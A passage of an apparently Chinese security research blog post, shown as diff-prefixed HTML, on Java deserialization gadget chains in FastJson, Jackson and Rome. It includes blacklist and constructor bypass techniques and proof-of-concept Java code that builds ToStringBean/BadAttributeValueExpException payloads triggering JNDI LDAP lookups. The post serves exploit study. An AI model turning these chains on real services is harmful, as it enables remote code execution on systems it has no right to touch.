+                        <span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">"invalid type code: %02X"</span><span class="o">,</span> <span class="n">tc</span><span class="o">));</span>
+            <span class="o">}</span>
+</pre></div>
+<p><code>readClassDesc、checkResolve</code>等方法最终都会走到<code>resolveClass</code> 而目标类若为引用类型便会走到<code>TC_REFERENCE</code> 中的<code>readHandle</code> 绕过了resolveClass</p>
+<p>也可以简单理解为，在外层Map中的时候就恢复过一次了，有缓存，所以第二次恢复就直接引用了</p>
+<p>推广一下这种绕过思路，<strong>当Gadget中的某个类在readObject里的resolveClass方法中添加了安全检查</strong>，我们只要能顺利通过<strong>入口的readObject方法</strong>，就可以<strong>将黑名单类对象转换为引用类型</strong>来绕过检测</p>
+<p>而当入口的readObject方法也做了黑名单检测之类的防御时，就需要结合二次反序列化进行绕过了（SignedObject、UnicastRef、JNDI.......）</p>
+<h4 data-content="1" id="baae13810e635a77633d4d9e2d164330">默认构造方法的必要性及其破除</h4>
+<p>当JsonObject中的目标类不存在默认构造方法（存在有参构造方法且不定义无参构造方法）时，会出现如下报错：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210140-5060b414-6ced-1.png"/></p>
+<p>问题出现在 AliyunCTF2023 #ezbean中，虽然目前的主流sink都不存在这个问题，但我们还是尝试解决一下</p>
+<h5 data-content="1" id="e1ed26078bc8a138bee9e62ac8b905c3">引用类型绕过</h5>
+<p>观察调用栈，发现报错是出在resolveClass-&gt;checkAutoType逻辑中，那就可以通过绕过resolveClass来解决问题，具体操作和上个部分一样</p>
+<h5 data-content="1" id="612f8a1704fc3cd99a8024e50b39bdec">缓存</h5>
+<p>跟进build方法，发现其会遍历一遍目标类的构造方法，如果找不到默认构造方法就会报错，显然build方法内部没有什么可干涉的点</p>
+<p>那能否<strong>在checkAutoType被调用的前提下，不让build方法被调用</strong>呢？看看build方法调用前的代码</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">jsonType</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
+                <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+            <span class="o">}</span>
+
+            <span class="k">if</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="c1">// classloader is danger</span>
+                    <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">DataSource</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="c1">// dataSource can load jdbc driver</span>
+                    <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">RowSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="c1">//</span>
+                    <span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">"autoType is not support. "</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">expectClass</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
+                    <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                    <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">"type not match. "</span> <span class="o">+</span> <span class="n">typeName</span> <span class="o">+</span> <span class="s">" -&gt; "</span> <span class="o">+</span> <span class="n">expectClass</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+
+            <span class="n">JavaBeanInfo</span> <span class="n">beanInfo</span> <span class="o">=</span> <span class="n">JavaBeanInfo</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">propertyNamingStrategy</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">beanInfo</span><span class="o">.</span><span class="na">creatorConstructor</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">autoTypeSupport</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">"autoType is not support. "</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+</pre></div>
+<p>可以看到，在build之前，会先将类加入到缓存中（开了AutoType且此时已经通过了黑名单检查）</p>
+<p>回想一下FastJson 1.2.47版本的绕过方式，如果能从缓存中找到目标类，会在很早的时候就加载类并返回，也就绕过了黑名单检查</p>
+<p>借鉴这种思路，我们可以<strong>添加缓存，提前返回类</strong>，从而避免build中的报错</p>
+<p>然而这里有一个区别，1.2.47绕过方式中使用了两个json；第一个json为目标类添加缓存，第二个json实现攻击；并且第一次反序列化不会报错中断流程，所以第二个json才能顺利被反序列化从而完成攻击</p>
+<p>而我们现在的情况是：完成攻击需要build A类，而build会报错，解决这个问题需要给A类加缓存，但是在给A类加缓存之后又一定会因为build A类而报错</p>
+<p>预想的操作是打两次，第一次加缓存，第二次借助缓存提前返回类，而这需要<strong>本次攻击加入的缓存持续生效至下一次攻击</strong></p>
+<p>这在<strong>报错即终止程序生命周期</strong>的情况下一定做不到，比如本地运行<code>serialize &amp; unserialize</code></p>
+<p>好在类缓存是存放在一个名为<code>mappings</code>的<strong>静态变量</strong>中的，在<strong>大多数服务器环境</strong>下，<strong>多试几次</strong>就能完成攻击</p>
+<h3 data-content="1" id="77a079872c5a9f6203bfa5c541083ea9">Jackson</h3>
+<p>引入以下jar包<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210204-5edc0cbe-6ced-1.png"/></p>
+<p>嫌麻烦的话直接引入 <code>springframework.boot.spring.starter.web</code>依赖就行</p>
+<h4 data-content="1" id="4bc37d2c1523ef1681be3aa1aab4559c">getter调用顺序不稳定及解决方式</h4>
+<p>这一块已经有师傅写过相关文章，我也就不做重复劳动了</p>
+<p>问题原因： <a href="https://mp.weixin.qq.com/s/XrAD1Q09mJ-95OXI2KaS9Q" target="_blank">https://mp.weixin.qq.com/s/XrAD1Q09mJ-95OXI2KaS9Q</a></p>
+<p>解决方式： <a href="https://xz.aliyun.com/t/12846" target="_blank">https://xz.aliyun.com/t/12846</a></p>
+<p>值得一提的是，Jackson结合LDAPAttribute使用的时候不需要这部分操作，<strong>如果添加了反而会出错（当然</strong></p>
+<h4 data-content="1" id="c8bf47a18a3c3f808574381801e456b1">删除writeplace()方法</h4>
+<p>这一块也早就有很多师傅提过，但因为是一个很小的点，并没有专门分析的文章，不太好直接扔个链接，我也就干脆顺便提一下</p>
+<p>在Java对象的序列化流程中，如果其类（或父类）拥有writeReplace方法（字面意思，writeObject 替代）就会走到类自己的序列化逻辑</p>
+<p>Jackson中的POJONode类就满足这个条件，在序列化的时候便会发生报错（Jackson序列化和Java原生序列化的数据自然是不同的）</p>
+<p>解决这个问题有多种思路，我们直接使用Javaassist字节码修改工具，删除BaseJsonNode类中的writeReplace方法即可</p>
+<div class="highlight"><pre><span></span><span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="s">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="o">);</span>
+        <span class="n">CtMethod</span> <span class="n">writeReplace</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"writeReplace"</span><span class="o">);</span>
+        <span class="n">ctClass</span><span class="o">.</span><span class="na">removeMethod</span><span class="o">(</span><span class="n">writeReplace</span><span class="o">);</span>
+        <span class="n">ctClass</span><span class="o">.</span><span class="na">toClass</span><span class="o">();</span>
+</pre></div>
+<h3 data-content="1" id="51136ad785bfe2e01d5dede5e3078be3">Rome</h3>
+<p>Rome 1.12.0之前都可以用，注意1.0和后续版本中beanClass、obj的属性名有差别（低版本属性名前会有一个下划线 <code>_</code> ）</p>
+<h4 data-content="1" id="aa07c4bfafb4e67cb1e2dfa0ff6400c5">TemplatesImpl</h4>
+<p>Rome结合TemplatesImpl利用时存在和Jackson相似的问题，可能会在调用别的getter时报错而提前终止流程</p>
+<p>这里也是采用相似的解决思路，使用Rome时可以直接在ToStringBean里指定从哪个类里获取getter，操作起来很简单</p>
+<div class="highlight"><pre><span></span><span class="n">Object</span> <span class="n">templatesImpl</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">templatesImpl</span><span class="o">);</span> <span class="c1">//在这里指定了从templates.class接口里去获取getter，</span>
+                                                                              <span class="c1">//其中只有一个getter：getOutputProperties()</span>
+        <span class="n">BadAttributeValueExpException</span> <span class="n">badAttributeValueExpException</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">Class</span> <span class="n">Bv</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.management.BadAttributeValueExpException"</span><span class="o">);</span>
+        <span class="n">Field</span> <span class="n">val</span> <span class="o">=</span> <span class="n">Bv</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"val"</span><span class="o">);</span>
+        <span class="n">val</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">val</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">,</span><span class="n">toStringBean</span><span class="o">);</span>
+        <span class="n">serialize</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">);</span>       
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
+</pre></div>
+<h4 data-content="1" id="0a3ac3c774ed835010f29e95e543f6a4">JdbcRowSetImpl</h4>
+<p>Rome链可以结合JdbcRowSetImpl使用，乍一看没什么大不了，但对getter调用流程有了解的师傅应该会意识到问题所在</p>
+<p>getter的调用是一个一个来的，如果中途报错，流程就会中断，让我们来看看JdbcRowSetImpl里的getter（property：仅A到D）<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210217-6675857c-6ced-1.png"/></p>
+<p>.......有点太多了，这也是为什么FastJson和Jackson结合JdbcRowSetImpl的利用都是会中途报错的</p>
+<p>回到Rome，真的有可能走到我们想要的getter而不报错吗？调试一下Rome结合JdbcRowSetImpl的利用代码</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">JdbcRowSetImpl</span> <span class="n">jdbcRowset</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JdbcRowSetImpl</span><span class="o">();</span>
+        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">"ldap://127.0.0.1:10990"</span><span class="o">;</span>
+        <span class="n">jdbcRowset</span><span class="o">.</span><span class="na">setDataSourceName</span><span class="o">(</span><span class="n">url</span><span class="o">);</span>
+
+        <span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">JdbcRowSetImpl</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">jdbcRowset</span><span class="o">);</span>
+        <span class="n">BadAttributeValueExpException</span> <span class="n">badAttributeValueExpException</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">Class</span> <span class="n">Bv</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.management.BadAttributeValueExpException"</span><span class="o">);</span>
+        <span class="n">Field</span> <span class="n">val</span> <span class="o">=</span> <span class="n">Bv</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"val"</span><span class="o">);</span>
+        <span class="n">val</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">val</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">,</span><span class="n">toStringBean</span><span class="o">);</span>
+
+        <span class="n">serialize</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">);</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
+    <span class="o">}</span>
+</pre></div>
+<p>在<code>getDatabaseMetaData()</code>处下一个断点，得到调用栈<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210233-6f9d6318-6ced-1.png"/></p>
+<p>在ToStringBean#toString(String):137<code>Object value = pReadMethod.invoke(_obj,NO_PARAMS);</code> 处下个断点，观察<code>pReadMethod</code></p>
+<ul>
+<li>getQueryTimeout</li>
+<li>getEscapeProcessing</li>
+<li>getMaxFieldSize</li>
+<li><strong>getDatabaseMetaData()</strong></li>
+<li>.............</li>
+</ul>
+<p>这个顺序又是怎么决定的呢，中间的过程很无聊，我就不详细说明了，感兴趣的师傅可以自己去调试一下，也没有多复杂</p>
+<p>总之最终的调用顺序是按照一个<code>HashMap</code>转换而成的<code>Descriptor</code>（当成List就行）来的，而我们都知道HashMap是根据<strong>键的哈希值</strong>来确定存储顺序的（相当于随机了）</p>
+<p>总之就是在这个机缘巧合之下，getter存放顺序很合适，使得<strong>在调用到<code>getDatabaseMetaData()</code>之前都不会报错</strong></p>
+<p>从而<strong>Rome链可以结合JdbcRowSetImpl使用！</strong></p>
+<h4 data-content="1" id="330174e9101e3cc088974a2b0064ac0b">LdapAttribute</h4>
+<p>Rome链不可以结合LdapAttribute使用，同样是很反直觉的一个现象，让我们看看LdapAttribute中的getter<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210246-77dc525a-6ced-1.png"/></p>
+<p>方法很少，并且都不会强制报错，我们的目标是调用到<code>getAttributeDefinition</code></p>
+<p>按理说没啥问题，在<code>getAttributeDefinition</code> 处下断点，调试一下</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">newInstance</span><span class="o">(</span><span class="s">"com.sun.jndi.ldap.LdapAttribute"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="s">"id"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"baseCtxURL"</span><span class="o">,</span> <span class="s">"ldap://127.0.0.1:11123"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="s">"rdn"</span><span class="o">,</span> <span class="k">new</span> <span class="n">CompositeName</span><span class="o">(</span><span class="s">"whocansee"</span><span class="o">+</span><span class="s">"//b"</span><span class="o">));</span>
+
+        <span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span><span class="n">obj</span><span class="o">);</span>
+
+        <span class="n">BadAttributeValueExpException</span> <span class="n">badAttributeValueExpException</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">Class</span> <span class="n">Bv</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"javax.management.BadAttributeValueExpException"</span><span class="o">);</span>
+        <span class="n">Field</span> <span class="n">val</span> <span class="o">=</span> <span class="n">Bv</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"val"</span><span class="o">);</span>
+        <span class="n">val</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">val</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">,</span><span class="n">toStringBean</span><span class="o">);</span>
+
+        <span class="n">serialize</span><span class="o">(</span><span class="n">badAttributeValueExpException</span><span class="o">);</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">newInstance</span><span class="o">(</span><span class="n">String</span> <span class="n">classname</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">paramTypes</span><span class="o">,</span> <span class="n">Object</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">InstantiationException</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">getConstructor</span><span class="o">(</span><span class="n">classname</span><span class="o">,</span> <span class="n">paramTypes</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="n">args</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">getConstructor</span><span class="o">(</span><span class="n">String</span> <span class="n">classname</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">paramTypes</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">NoSuchMethodException</span> <span class="o">{</span>
+        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">ctor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">classname</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">paramTypes</span><span class="o">);</span>
+        <span class="n">ctor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="k">return</span> <span class="n">ctor</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="kd">final</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="kd">final</span> <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">field</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Field</span> <span class="nf">getField</span><span class="o">(</span><span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+                <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">field</span><span class="o">;</span>
+    <span class="o">}</span>
+</pre></div>
+<p>没走到想要的断点。把之前研究JdbcRowSetImpl下的断点开一下，慢慢跟</p>
+<p><del>中间的过程很繁琐，低版本Rome就算实际是报错了也不会打印报错信息，根本不知道是哪里抛出的错误。我一步一个断点，痛苦调试快十分钟才找到出错的地方</del></p>
+<p>建议使用高版本Rome，一步到位<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210306-839cbc56-6ced-1.png"/></p>
+<p>在<code>PropertyDescriptor#PropertyDescriptor(String,Method,Method) L135：IntrospectionException("bad property name");</code>下断点， <strong>分析结果如下：</strong></p>
+<p>LDAPAttribute类有一个get方法：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210358-a293a62e-6ced-1.png"/></p>
+<p>ROME的序列化逻辑中会获取到它，然后获取pName(propertyName)——什么都没有，随后直接报错<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210410-a9e187a2-6ced-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210424-b1e0312e-6ced-1.png"/></p>
+<p>实在是让人哭笑不得的问题，这处设计的用意显然也不是用来防御的，但我们攻击中的这一环恰好就会因此断开</p>
+<p>有没有什么办法解决呢？前面也遇到了相似的问题，尝试迁移一下思路</p>
+<h5 data-content="1" id="43fafabd8144f9449c1f329725a196d4">多打几次拼运气（×）</h5>
+<p>由于getter就这几个，再加上getter调用顺序随机的机制，理论上来说打个几十次大概率能至少有一次成功</p>
+<p>可惜的是，这个问题是出在获取getter时，根本都进入不到调用的流程</p>
+<h5 data-content="1" id="8741d893c5af51f816e2a197f3bcbb3a">找一个没有get方法的父类或接口（×）</h5>
+<p>很可惜，就算找到<code>LdapAttribute</code>的接口<code>Attribute</code>，都仍然有<code>get()</code>方法</p>
+<p>目前为止没能发现别的思路，因此<strong>Rome链确实是不可以结合LdapAttribute使用的</strong></p>
+<h4 data-content="1" id="cc961226cd522aad29cb0dd63b7a0de7">1.12.0后的修复</h4>
+<p>Rome链在1.12.0之后的版本不可用了，修复主要集中在对于ToStringBean类的修改</p>
+<p>首先是构造方法的修改</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="nf">ToStringBean</span><span class="o">()</span> <span class="o">{}</span>
+</pre></div>
+<p>这一点对于攻击利用来说无伤大雅，<strong>真正致命的修复是对toString方法的修改</strong></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">beanClass</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">)</span>
+</pre></div>
+<p>老版本的toString()是无参的，其中beanClass（决定了从哪个类里获取getter）和obj（决定调用哪个对象的getter）都是直接用<strong>类属性</strong>里的，通过构造方法传入或者反射修改类属性的方式都可以操纵这两个关键参数</p>
+<p>修复后，这两个参数由调用toString的地方传入<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20231017210344-9a5bdb02-6ced-1.png"/></p>
+<p>需要两处都可控才有可能继续利用，这么看来显然是不行的了，<strong>1.12.0后Rome链确实是不能再利用了</strong></p>
+<h2 data-content="1" id="f9294f3cd860fca5a43cf605eb8ce73b">工具实现</h2>
+<p>本文所述所有payload都可以在wh1t3p1g师傅的ysomap项目中找到（其中有几条是我贡献的XD）</p>
+<p><a href="https://github.com/wh1t3p1g/ysomap" target="_blank">https://github.com/wh1t3p1g/ysomap</a></p>
+<p>My GitHub：<a href="https://github.com/whocansee" target="_blank">https://github.com/whocansee</a></p>
+<h2 data-content="1" id="b956579092f6a068bd279b2e5eb054d1">参考</h2>
+<p><a href="https://xz.aliyun.com/t/12768" target="_blank">https://xz.aliyun.com/t/12768</a></p>
+<p><a href="https://paper.seebug.org/2055" target="_blank">https://paper.seebug.org/2055</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/638158617" target="_blank">https://zhuanlan.zhihu.com/p/638158617</a></p>
+<p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/" target="_blank">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p>
+</div>
+</div>
